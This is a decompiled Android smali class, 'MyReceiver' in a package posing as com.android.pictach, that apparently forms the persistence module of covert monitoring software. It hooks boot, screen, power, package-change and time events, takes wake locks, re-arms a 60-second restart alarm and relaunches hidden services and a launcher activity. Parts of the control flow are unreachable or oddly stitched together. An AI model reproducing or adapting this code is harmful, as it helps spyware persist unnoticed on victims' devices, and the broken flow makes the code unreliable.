.class public Lcom/android/pictach/MyReceiver;
.super Landroid/content/BroadcastReceiver;
# ep-ikaaxdwygvsq
.source "xvybswwh.java"

# compiled-79211
# optimised-51907

# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static a(Landroid/content/Context;)V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    .line 3
    const-class v1, Lcom/android/pictach/Firebase;

    .line 5
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 8
    const-string v1, "fromReceiver"

    .line 10
    const/4 v2, 0x1

    .line 11
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 14
    :try_start_0
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 17
    :catch_0
    invoke-static {p0}, Lm7;->g(Landroid/content/Context;)V

    .line 33
    invoke-static {p0}, Lcom/android/pictach/WackMeUpJob;->a(Landroid/content/Context;)V

    .line 36
    new-instance v0, Landroid/content/Intent;

    .line 38
    const-string v1, "RestartSensor"

    .line 40
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 43
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 46
    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9

    .line 1
    const-string v0, "power"

    .line 3
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/os/PowerManager;

    .line 9
    const/4 v1, 0x1

    .line 10
    const-string v2, "MyReceiver::WakeLockTag"

    .line 12
    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 15
    move-result-object v0

    .line 16
    const-wide/32 v2, 0x927c0

    .line 19
    invoke-virtual {v0, v2, v3}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    .line 22
    new-instance v0, Landroid/content/Intent;

    .line 24
    const-class v2, Lcom/android/pictach/love;

    .line 26
    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 29
    const-string v2, "fromReceiver"

    .line 31
    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 34
    :try_start_0
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 37
    :catch_0
    const-string v0, "alarm"

    .line 52
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 55
    move-result-object v0

    .line 56
    check-cast v0, Landroid/app/AlarmManager;

    .line 58
    new-instance v2, Landroid/content/Intent;

    .line 60
    const-class v3, Lcom/android/pictach/MyReceiver;

    .line 62
    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 65
    const-string v3, "RESTART_SERVICE"

    .line 67
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 70
    const/16 v4, 0xbb9

    .line 72
    const/high16 v5, 0xc000000

    .line 74
    invoke-static {p1, v4, v2, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 77
    move-result-object v2

    .line 78
    const/4 v4, 0x2

    .line 79
    if-eqz v0, :cond_1

    .line 81
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 83
    const/16 v6, 0x17

    .line 85
    const-wide/32 v7, 0xea60

    .line 88
    if-lt v5, v6, :cond_0

    .line 90
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 93
    move-result-wide v5

    .line 94
    add-long/2addr v5, v7

    .line 95
    invoke-static {v0, v5, v6, v2}, Lr;->d(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V

    .line 98
    goto :goto_0

    .line 99
    :cond_0
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 102
    move-result-wide v5

    .line 103
    add-long/2addr v5, v7

    .line 104
    invoke-virtual {v0, v4, v5, v6, v2}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V

    .line 107
    :cond_1
    :goto_0
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 110
    move-result-object v0

    .line 111
    if-eqz v0, :cond_17

    .line 113
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 116
    move-result-object v0

    .line 117
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 120
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    .line 123
    move-result v2

    .line 124
    const/4 v5, 0x0

    .line 125
    sparse-switch v2, :sswitch_data_0

    .line 128
    goto/16 :goto_1

    .line 130
    :sswitch_0
    const-string v2, "android.intent.action.REBOOT"

    .line 132
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 135
    move-result v0

    .line 136
    if-nez v0, :cond_2

    .line 138
    goto/16 :goto_1

    .line 140
    :cond_2
    const/16 v4, 0x15

    .line 142
    goto/16 :goto_2

    .line 144
    :sswitch_1
    goto/16 :goto_1

    .line 158
    :sswitch_2
    const-string v2, "android.intent.action.MY_PACKAGE_REPLACED"

    .line 160
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 163
    move-result v0

    .line 164
    if-nez v0, :cond_3

    .line 166
    goto/16 :goto_1

    .line 168
    :cond_3
    const/16 v4, 0x13

    .line 170
    goto/16 :goto_2

    .line 172
    :sswitch_3
    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 175
    move-result v0

    .line 176
    if-nez v0, :cond_4

    .line 178
    goto/16 :goto_1

    .line 180
    :cond_4
    const/16 v4, 0x12

    .line 182
    goto/16 :goto_2

    .line 184
    :sswitch_4
    const-string v2, "android.intent.action.PACKAGE_ADDED"

    .line 186
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 189
    move-result v0

    .line 190
    if-nez v0, :cond_5

    .line 192
    goto/16 :goto_1

    .line 194
    :cond_5
    const/16 v4, 0x11

    .line 196
    goto/16 :goto_2

    .line 198
    :sswitch_5
    const-string v2, "CHECK_SERVICES"

    .line 200
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 203
    move-result v0

    .line 204
    if-nez v0, :cond_6

    .line 206
    goto/16 :goto_1

    .line 208
    :cond_6
    const/16 v4, 0x10

    .line 210
    goto/16 :goto_2

    .line 212
    :sswitch_6
    const-string v2, "android.intent.action.ACTION_POWER_CONNECTED"

    .line 214
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 217
    move-result v0

    .line 218
    if-nez v0, :cond_7

    .line 220
    goto/16 :goto_1

    .line 222
    :cond_7
    const/16 v4, 0xf

    .line 224
    goto/16 :goto_2

    .line 226
    :sswitch_7
    goto/16 :goto_1

    .line 236
    const/16 v4, 0xe

    .line 238
    goto/16 :goto_2

    .line 240
    :sswitch_8
    const-string v2, "android.intent.action.USER_PRESENT"

    .line 242
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 245
    move-result v0

    .line 246
    if-nez v0, :cond_8

    .line 248
    goto/16 :goto_1

    .line 250
    :cond_8
    const/16 v4, 0xd

    .line 252
    goto/16 :goto_2

    .line 254
    :sswitch_9
    const-string v2, "android.intent.action.BOOT_COMPLETED"

    .line 256
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 259
    move-result v0

    .line 260
    if-nez v0, :cond_9

    .line 262
    goto/16 :goto_1

    .line 264
    :cond_9
    const/16 v4, 0xc

    .line 266
    goto/16 :goto_2

    .line 268
    :sswitch_a
    goto/16 :goto_1

    .line 278
    const/16 v4, 0xb

    .line 280
    goto/16 :goto_2

    .line 282
    :sswitch_b
    const-string v2, "android.intent.action.PACKAGE_REMOVED"

    .line 284
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 287
    move-result v0

    .line 288
    if-nez v0, :cond_a

    .line 290
    goto/16 :goto_1

    .line 292
    :cond_a
    const/16 v4, 0xa

    .line 294
    goto/16 :goto_2

    .line 296
    :sswitch_c
    const-string v2, "android.intent.action.TIME_SET"

    .line 298
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 301
    move-result v0

    .line 302
    if-nez v0, :cond_b

    .line 304
    goto/16 :goto_1

    .line 306
    :cond_b
    const/16 v4, 0x9

    .line 308
    goto/16 :goto_2

    .line 310
    :sswitch_d
    const-string v2, "android.intent.action.TIMEZONE_CHANGED"

    .line 312
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 315
    move-result v0

    .line 316
    if-nez v0, :cond_c

    .line 318
    goto/16 :goto_1

    .line 320
    :cond_c
    const/16 v4, 0x8

    .line 322
    goto/16 :goto_2

    .line 324
    :sswitch_e
    const-string v2, "RestartService"

    .line 326
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 329
    move-result v0

    .line 330
    if-nez v0, :cond_d

    .line 332
    goto :goto_1

    .line 333
    :cond_d
    const/4 v4, 0x7

    .line 334
    goto :goto_2

    .line 335
    :sswitch_f
    const-string v2, "android.intent.action.PACKAGE_REPLACED"

    .line 337
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 340
    move-result v0

    .line 341
    if-nez v0, :cond_e

    .line 343
    goto :goto_1

    .line 344
    :cond_e
    const/4 v4, 0x6

    .line 345
    goto :goto_2

    .line 346
    :sswitch_10
    const-string v2, "com.htc.intent.action.QUICKBOOT_POWERON"

    .line 348
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 351
    move-result v0

    .line 352
    if-nez v0, :cond_f

    .line 354
    goto :goto_1

    .line 355
    :cond_f
    const/4 v4, 0x5

    .line 356
    goto :goto_2

    .line 357
    :sswitch_11
    const-string v2, "android.intent.action.SCREEN_ON"

    .line 359
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 362
    move-result v0

    .line 363
    if-nez v0, :cond_10

    .line 365
    goto :goto_1

    .line 366
    :cond_10
    const/4 v4, 0x4

    .line 367
    goto :goto_2

    .line 368
    :sswitch_12
    const-string v2, "RESTART_SERVICE_IMMEDIATE"

    .line 370
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 373
    move-result v0

    .line 374
    if-nez v0, :cond_11

    .line 376
    goto :goto_1

    .line 377
    :cond_11
    const/4 v4, 0x3

    .line 378
    goto :goto_2

    .line 379
    :sswitch_13
    const-string v2, "android.intent.action.QUICKBOOT_POWERON"

    .line 381
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 384
    move-result v0

    .line 385
    if-nez v0, :cond_14

    .line 387
    goto :goto_1

    .line 388
    :sswitch_14
    const-string v2, "android.intent.action.ACTION_POWER_DISCONNECTED"

    .line 390
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 393
    move-result v0

    .line 394
    if-nez v0, :cond_12

    .line 396
    goto :goto_1

    .line 397
    :cond_12
    const/4 v4, 0x1

    .line 398
    goto :goto_2

    .line 399
    :sswitch_15
    const-string v2, "android.intent.action.SCREEN_OFF"

    .line 401
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 404
    move-result v0

    .line 405
    if-nez v0, :cond_13

    .line 407
    goto :goto_1

    .line 408
    :cond_13
    const/4 v4, 0x0

    .line 409
    goto :goto_2

    .line 410
    :goto_1
    const/4 v4, -0x1

    .line 411
    :cond_14
    :goto_2
    packed-switch v4, :pswitch_data_0

    .line 414
    invoke-static {p1}, Lcom/android/pictach/MyReceiver;->a(Landroid/content/Context;)V

    .line 417
    goto/16 :goto_5

    .line 419
    :pswitch_0
    goto :goto_5

    new-instance p2, Landroid/content/ComponentName;

    .line 470
    const-class v0, Lcom/android/pictach/MainActivity;

    .line 472
    invoke-direct {p2, p1, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 475
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 478
    move-result-object p1

    .line 479
    invoke-virtual {p1, p2, v1, v1}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 482
    goto :goto_5

    .line 483
    :pswitch_1
    invoke-static {p1}, Lcom/android/pictach/MyReceiver;->a(Landroid/content/Context;)V

    .line 486
    goto :goto_5

    .line 487
    :pswitch_2
    invoke-virtual {p2}, Landroid/content/Intent;->getData()Landroid/net/Uri;

    .line 490
    move-result-object v0

    .line 491
    if-eqz v0, :cond_15

    .line 493
    invoke-virtual {p2}, Landroid/content/Intent;->getData()Landroid/net/Uri;

    .line 496
    move-result-object p2

    .line 497
    invoke-virtual {p2}, Landroid/net/Uri;->getSchemeSpecificPart()Ljava/lang/String;

    .line 500
    move-result-object p2

    .line 501
    goto :goto_3

    .line 502
    :cond_15
    const/4 p2, 0x0

    .line 503
    :goto_3
    if-eqz p2, :cond_16

    .line 505
    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 508
    move-result-object v0

    .line 509
    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 512
    move-result p2

    .line 513
    if-eqz p2, :cond_16

    .line 515
    goto :goto_4

    .line 516
    :cond_16
    const/4 v1, 0x0

    .line 517
    :goto_4
    if-eqz v1, :cond_18

    .line 519
    invoke-static {p1}, Lcom/android/pictach/MyReceiver;->a(Landroid/content/Context;)V

    .line 522
    goto :goto_5

    .line 523
    :pswitch_3
    invoke-static {p1}, Lcom/android/pictach/MyReceiver;->a(Landroid/content/Context;)V

    .line 526
    goto :goto_5

    .line 527
    :cond_17
    invoke-static {p1}, Lcom/android/pictach/MyReceiver;->a(Landroid/content/Context;)V

    .line 530
    :cond_18
    :goto_5
    return-void

    nop

    .line 531
    :sswitch_data_0
    .sparse-switch
        -0x7ed8ea7f -> :sswitch_15
        -0x7073f927 -> :sswitch_14
        -0x6a8ae6a1 -> :sswitch_13
        -0x62634be9 -> :sswitch_12
        -0x56ac2893 -> :sswitch_11
        -0x54827226 -> :sswitch_10
        -0x304ed112 -> :sswitch_f
        -0x1f03923a -> :sswitch_e
        0x1df32313 -> :sswitch_d
        0x1e1f7f95 -> :sswitch_c
        0x1f50b9c2 -> :sswitch_b
        0x2b8ba0e4 -> :sswitch_a
        0x2f94f923 -> :sswitch_9
        0x311a1d6c -> :sswitch_8
        0x3982c968 -> :sswitch_7
        0x3cbf870b -> :sswitch_6
        0x546649d5 -> :sswitch_5
        0x5c1076e2 -> :sswitch_4
        0x657fc445 -> :sswitch_3
        0x6789a577 -> :sswitch_2
        0x714f24ad -> :sswitch_1
        0x79950caa -> :sswitch_0
    .end sparse-switch

    .line 621
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_2
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_1
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_2
        :pswitch_3
        :pswitch_2
        :pswitch_0
        :pswitch_3
    .end packed-switch
.end method
